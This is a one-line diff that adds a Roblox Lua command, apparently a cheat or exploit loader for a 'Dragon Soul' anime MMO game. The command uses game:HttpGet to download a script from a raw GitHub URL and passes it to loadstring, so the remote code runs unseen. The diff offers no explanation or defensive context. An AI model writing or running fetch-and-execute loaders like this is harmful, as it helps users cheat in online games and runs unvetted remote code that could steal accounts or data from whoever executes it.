@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/moduletanagerdefend/loaders/main/loaders/qol-update-dragon-soul-anime-mmo-spam3-f5fqctpsmkfurn.lua"))()
